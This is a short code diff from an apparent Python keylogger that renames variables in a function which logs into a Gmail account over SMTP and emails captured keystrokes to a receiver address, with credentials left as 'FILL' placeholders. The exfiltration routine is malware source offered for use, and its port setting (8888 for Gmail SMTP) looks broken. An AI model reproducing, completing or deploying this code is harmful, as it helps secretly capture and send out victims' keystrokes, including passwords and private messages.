@@ -7,9 +7,9 @@ keys = []
 def send_to_email(message_text):
 	smtp_server = "smtp.gmail.com" #smtp for Gmail, so we can send the email
 	port = 8888
-	sender_email = "FILL" #change "FILL" to sender email
+	sender_gmail = "FILL" #change "FILL" to sender email
 	password = "FILL" #change "FILL" to the password of the gmail account so it can send the keystroke
-	receiver_email = "FILL" #change "FILL" to receiver email so it can receive the keystroke (can be the same as sender_email)
+	receiver_gmail = "FILL" #change "FILL" to receiver email so it can receive the keystroke (can be the same as sender_gmail)
 	context = ssl.create_default_context()
 
 	try:
@@ -17,8 +17,8 @@ def send_to_email(message_text):
 	    server.ehlo() 
 	    server.starttls(context=context) 
 	    server.ehlo()
-	    server.login(sender_email, password)
-	    server.sendmail(sender_email, receiver_email, message_text)
+	    server.login(sender_gmail, password)
+	    server.sendmail(sender_gmail, receiver_gmail, message_text)
 	   
 	except Exception as e:
 	    print(e)
